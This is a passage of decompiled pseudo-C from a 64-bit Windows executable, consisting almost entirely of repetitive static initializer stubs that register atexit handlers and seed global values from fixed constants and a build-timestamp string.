  if ( !(dword_1400DA6A0 & 1) )
  {
    dword_1400DA6A0 |= 1u;
    qword_1400DA698 = (__int64)off_1400A7728;
    atexit(sub_14009FD80);
  }
  result = &qword_1400DA698;
  qword_1400DA658 = (__int64)&qword_1400DA698;
  return result;
}
// 1400A7728: using guessed type __int64 (__fastcall *off_1400A7728[2])();
// 1400DA658: using guessed type __int64 qword_1400DA658;
// 1400DA698: using guessed type __int64 qword_1400DA698;
// 1400DA6A0: using guessed type int dword_1400DA6A0;

//----- (0000000140001E90) ----------------------------------------------------
__int64 *sub_140001E90()
{
  __int64 *result; // rax

  if ( !(dword_1400DA690 & 1) )
  {
    dword_1400DA690 |= 1u;
    qword_1400DA688 = (__int64)off_1400A7758;
    atexit(sub_14009FD90);
  }
  result = &qword_1400DA688;
  qword_1400DA648 = (__int64)&qword_1400DA688;
  return result;
}
// 1400A7758: using guessed type __int64 (__fastcall *off_1400A7758[2])();
// 1400DA648: using guessed type __int64 qword_1400DA648;
// 1400DA688: using guessed type __int64 qword_1400DA688;
// 1400DA690: using guessed type int dword_1400DA690;

//----- (0000000140001F40) ----------------------------------------------------
int sub_140001F40()
{
  return atexit((void (__cdecl *)())sub_14009FF30);
}

//----- (0000000140001F50) ----------------------------------------------------
__int64 __fastcall sub_140001F50(__int64 a1)
{
  __int64 result; // rax

  result = sub_140030C00(a1);
  dword_1400DA720 = 3;
  qword_1400DA728 = result;
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400DA720: using guessed type int dword_1400DA720;
// 1400DA728: using guessed type __int64 qword_1400DA728;

//----- (0000000140001F70) ----------------------------------------------------
__int64 __fastcall sub_140001F70(__int64 a1)
{
  __int64 result; // rax

  result = sub_140030C00(a1);
  qword_1400DA738 = result;
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400DA738: using guessed type __int64 qword_1400DA738;

//----- (0000000140001F90) ----------------------------------------------------
int sub_140001F90()
{
  sub_140004F20(&Dst, "AAD", 3ui64);
  return atexit(sub_14009FF80);
}

//----- (0000000140001FC0) ----------------------------------------------------
int sub_140001FC0()
{
  return atexit((void (__cdecl *)())sub_14009FFF0);
}

//----- (0000000140001FD0) ----------------------------------------------------
__int64 sub_140001FD0()
{
  __int64 result; // rax

  result = qword_1400DA7B0;
  qword_1400DA7A8 = qword_1400DA7B0;
  return result;
}
// 1400DA7A8: using guessed type __int64 qword_1400DA7A8;
// 1400DA7B0: using guessed type __int64 qword_1400DA7B0;

//----- (0000000140001FE0) ----------------------------------------------------
__int64 sub_140001FE0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA7BC = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA7BC: using guessed type int dword_1400DA7BC;

//----- (0000000140002000) ----------------------------------------------------
__int64 sub_140002000()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA7B8 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA7B8: using guessed type int dword_1400DA7B8;

//----- (0000000140002020) ----------------------------------------------------
int sub_140002020()
{
  _QWORD *v0; // rax

  v0 = operator new(8ui64);
  if ( v0 )
    *v0 = off_1400A8AB8;
  qword_1400DA7B0 = (__int64)v0;
  return atexit(sub_1400A0080);
}
// 1400A8AB8: using guessed type __int64 (__fastcall *off_1400A8AB8[3])();
// 1400DA7B0: using guessed type __int64 qword_1400DA7B0;

//----- (0000000140002060) ----------------------------------------------------
__int64 sub_140002060()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA7C0 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA7C0: using guessed type int dword_1400DA7C0;

//----- (0000000140002080) ----------------------------------------------------
__int64 sub_140002080()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA7A4 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA7A4: using guessed type int dword_1400DA7A4;

//----- (00000001400020A0) ----------------------------------------------------
__int64 sub_1400020A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA86C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA86C: using guessed type int dword_1400DA86C;

//----- (00000001400020C0) ----------------------------------------------------
__int64 sub_1400020C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA868 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA868: using guessed type int dword_1400DA868;

//----- (00000001400020E0) ----------------------------------------------------
__int64 sub_1400020E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA870 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA870: using guessed type int dword_1400DA870;

//----- (0000000140002100) ----------------------------------------------------
__int64 sub_140002100()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA864 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA864: using guessed type int dword_1400DA864;

//----- (0000000140002120) ----------------------------------------------------
__int64 sub_140002120()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAA40 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAA40: using guessed type int dword_1400DAA40;

//----- (0000000140002140) ----------------------------------------------------
__int64 sub_140002140()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAA3C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAA3C: using guessed type int dword_1400DAA3C;

//----- (0000000140002160) ----------------------------------------------------
__int64 sub_140002160()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAA44 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAA44: using guessed type int dword_1400DAA44;

//----- (0000000140002180) ----------------------------------------------------
__int64 sub_140002180()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAA38 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAA38: using guessed type int dword_1400DAA38;

//----- (00000001400021A0) ----------------------------------------------------
__int64 sub_1400021A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB60 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB60: using guessed type int dword_1400DAB60;

//----- (00000001400021C0) ----------------------------------------------------
__int64 sub_1400021C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB5C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB5C: using guessed type int dword_1400DAB5C;

//----- (00000001400021E0) ----------------------------------------------------
__int64 sub_1400021E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB64 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB64: using guessed type int dword_1400DAB64;

//----- (0000000140002200) ----------------------------------------------------
__int64 sub_140002200()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB58 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB58: using guessed type int dword_1400DAB58;

//----- (0000000140002220) ----------------------------------------------------
__int64 sub_140002220()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB74 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB74: using guessed type int dword_1400DAB74;

//----- (0000000140002240) ----------------------------------------------------
__int64 sub_140002240()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB70 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB70: using guessed type int dword_1400DAB70;

//----- (0000000140002260) ----------------------------------------------------
__int64 sub_140002260()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB78 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB78: using guessed type int dword_1400DAB78;

//----- (0000000140002280) ----------------------------------------------------
__int64 sub_140002280()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB6C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB6C: using guessed type int dword_1400DAB6C;

//----- (00000001400022A0) ----------------------------------------------------
__int64 sub_1400022A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB98 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB98: using guessed type int dword_1400DAB98;

//----- (00000001400022C0) ----------------------------------------------------
__int64 sub_1400022C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB94 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB94: using guessed type int dword_1400DAB94;

//----- (00000001400022E0) ----------------------------------------------------
__int64 sub_1400022E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB9C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB9C: using guessed type int dword_1400DAB9C;

//----- (0000000140002300) ----------------------------------------------------
__int64 sub_140002300()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAB90 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAB90: using guessed type int dword_1400DAB90;

//----- (0000000140002320) ----------------------------------------------------
__int64 sub_140002320()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABD4 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABD4: using guessed type int dword_1400DABD4;

//----- (0000000140002340) ----------------------------------------------------
__int64 sub_140002340()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABD0 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABD0: using guessed type int dword_1400DABD0;

//----- (0000000140002360) ----------------------------------------------------
__int64 sub_140002360()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABD8 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABD8: using guessed type int dword_1400DABD8;

//----- (0000000140002380) ----------------------------------------------------
__int64 sub_140002380()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABCC = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABCC: using guessed type int dword_1400DABCC;

//----- (00000001400023A0) ----------------------------------------------------
__int64 sub_1400023A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABE8 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABE8: using guessed type int dword_1400DABE8;

//----- (00000001400023C0) ----------------------------------------------------
__int64 sub_1400023C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABE4 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABE4: using guessed type int dword_1400DABE4;

//----- (00000001400023E0) ----------------------------------------------------
__int64 sub_1400023E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABEC = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABEC: using guessed type int dword_1400DABEC;

//----- (0000000140002400) ----------------------------------------------------
__int64 sub_140002400()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DABE0 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DABE0: using guessed type int dword_1400DABE0;

//----- (0000000140002420) ----------------------------------------------------
__int64 sub_140002420()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC20 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC20: using guessed type int dword_1400DAC20;

//----- (0000000140002440) ----------------------------------------------------
__int64 sub_140002440()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC1C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC1C: using guessed type int dword_1400DAC1C;

//----- (0000000140002460) ----------------------------------------------------
__int64 sub_140002460()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC24 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC24: using guessed type int dword_1400DAC24;

//----- (0000000140002480) ----------------------------------------------------
__int64 sub_140002480()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC18 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC18: using guessed type int dword_1400DAC18;

//----- (00000001400024A0) ----------------------------------------------------
__int64 sub_1400024A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC34 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC34: using guessed type int dword_1400DAC34;

//----- (00000001400024C0) ----------------------------------------------------
__int64 sub_1400024C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC30 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC30: using guessed type int dword_1400DAC30;

//----- (00000001400024E0) ----------------------------------------------------
__int64 sub_1400024E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC38 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC38: using guessed type int dword_1400DAC38;

//----- (0000000140002500) ----------------------------------------------------
__int64 sub_140002500()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC2C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC2C: using guessed type int dword_1400DAC2C;

//----- (0000000140002520) ----------------------------------------------------
__int64 sub_140002520()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC48 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC48: using guessed type int dword_1400DAC48;

//----- (0000000140002540) ----------------------------------------------------
__int64 sub_140002540()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC44 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC44: using guessed type int dword_1400DAC44;

//----- (0000000140002560) ----------------------------------------------------
__int64 sub_140002560()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC4C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC4C: using guessed type int dword_1400DAC4C;

//----- (0000000140002580) ----------------------------------------------------
__int64 sub_140002580()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC40 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC40: using guessed type int dword_1400DAC40;

//----- (00000001400025A0) ----------------------------------------------------
__int64 sub_1400025A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC5C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC5C: using guessed type int dword_1400DAC5C;

//----- (00000001400025C0) ----------------------------------------------------
__int64 sub_1400025C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC58 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC58: using guessed type int dword_1400DAC58;

//----- (00000001400025E0) ----------------------------------------------------
__int64 sub_1400025E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC60 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC60: using guessed type int dword_1400DAC60;

//----- (0000000140002600) ----------------------------------------------------
__int64 sub_140002600()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DAC54 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DAC54: using guessed type int dword_1400DAC54;

//----- (0000000140002620) ----------------------------------------------------
__int64 sub_140002620()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DB490 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DB490: using guessed type int dword_1400DB490;

//----- (0000000140002640) ----------------------------------------------------
__int64 sub_140002640()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DB48C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DB48C: using guessed type int dword_1400DB48C;

//----- (0000000140002660) ----------------------------------------------------
__int64 sub_140002660()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DB494 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DB494: using guessed type int dword_1400DB494;

//----- (0000000140002680) ----------------------------------------------------
__int64 sub_140002680()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DB488 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DB488: using guessed type int dword_1400DB488;

//----- (00000001400026A0) ----------------------------------------------------
__int64 sub_1400026A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCAC = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCAC: using guessed type int dword_1400DBCAC;

//----- (00000001400026C0) ----------------------------------------------------
__int64 sub_1400026C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCA8 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCA8: using guessed type int dword_1400DBCA8;

//----- (00000001400026E0) ----------------------------------------------------
__int64 sub_1400026E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCB0 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCB0: using guessed type int dword_1400DBCB0;

//----- (0000000140002700) ----------------------------------------------------
__int64 sub_140002700()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCA4 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCA4: using guessed type int dword_1400DBCA4;

//----- (0000000140002720) ----------------------------------------------------
__int64 sub_140002720()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCC0 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCC0: using guessed type int dword_1400DBCC0;

//----- (0000000140002740) ----------------------------------------------------
__int64 sub_140002740()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCBC = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCBC: using guessed type int dword_1400DBCBC;

//----- (0000000140002760) ----------------------------------------------------
__int64 sub_140002760()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCC4 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCC4: using guessed type int dword_1400DBCC4;

//----- (0000000140002780) ----------------------------------------------------
__int64 sub_140002780()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCB8 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCB8: using guessed type int dword_1400DBCB8;

//----- (00000001400027A0) ----------------------------------------------------
__int64 sub_1400027A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCD4 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCD4: using guessed type int dword_1400DBCD4;

//----- (00000001400027C0) ----------------------------------------------------
__int64 sub_1400027C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCD0 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCD0: using guessed type int dword_1400DBCD0;

//----- (00000001400027E0) ----------------------------------------------------
__int64 sub_1400027E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCD8 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCD8: using guessed type int dword_1400DBCD8;

//----- (0000000140002800) ----------------------------------------------------
__int64 sub_140002800()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCCC = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCCC: using guessed type int dword_1400DBCCC;

//----- (0000000140002820) ----------------------------------------------------
__int64 sub_140002820()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCE8 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCE8: using guessed type int dword_1400DBCE8;

//----- (0000000140002840) ----------------------------------------------------
__int64 sub_140002840()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCE4 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCE4: using guessed type int dword_1400DBCE4;

//----- (0000000140002860) ----------------------------------------------------
__int64 sub_140002860()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCEC = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCEC: using guessed type int dword_1400DBCEC;

//----- (0000000140002880) ----------------------------------------------------
__int64 sub_140002880()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCE0 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCE0: using guessed type int dword_1400DBCE0;

//----- (00000001400028A0) ----------------------------------------------------
__int64 sub_1400028A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCFC = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCFC: using guessed type int dword_1400DBCFC;

//----- (00000001400028C0) ----------------------------------------------------
__int64 sub_1400028C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCF8 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCF8: using guessed type int dword_1400DBCF8;

//----- (00000001400028E0) ----------------------------------------------------
__int64 sub_1400028E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD00 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD00: using guessed type int dword_1400DBD00;

//----- (0000000140002900) ----------------------------------------------------
__int64 sub_140002900()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBCF4 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBCF4: using guessed type int dword_1400DBCF4;

//----- (0000000140002920) ----------------------------------------------------
__int64 sub_140002920()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD10 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD10: using guessed type int dword_1400DBD10;

//----- (0000000140002940) ----------------------------------------------------
__int64 sub_140002940()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD0C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD0C: using guessed type int dword_1400DBD0C;

//----- (0000000140002960) ----------------------------------------------------
__int64 sub_140002960()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD14 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD14: using guessed type int dword_1400DBD14;

//----- (0000000140002980) ----------------------------------------------------
__int64 sub_140002980()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD08 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD08: using guessed type int dword_1400DBD08;

//----- (00000001400029A0) ----------------------------------------------------
__int64 sub_1400029A0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD24 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD24: using guessed type int dword_1400DBD24;

//----- (00000001400029C0) ----------------------------------------------------
__int64 sub_1400029C0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD20 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD20: using guessed type int dword_1400DBD20;

//----- (00000001400029E0) ----------------------------------------------------
__int64 sub_1400029E0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD28 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD28: using guessed type int dword_1400DBD28;

//----- (0000000140002A00) ----------------------------------------------------
__int64 sub_140002A00()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD1C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD1C: using guessed type int dword_1400DBD1C;

//----- (0000000140002A20) ----------------------------------------------------
__int64 sub_140002A20()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD44 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD44: using guessed type int dword_1400DBD44;

//----- (0000000140002A40) ----------------------------------------------------
__int64 sub_140002A40()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD40 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
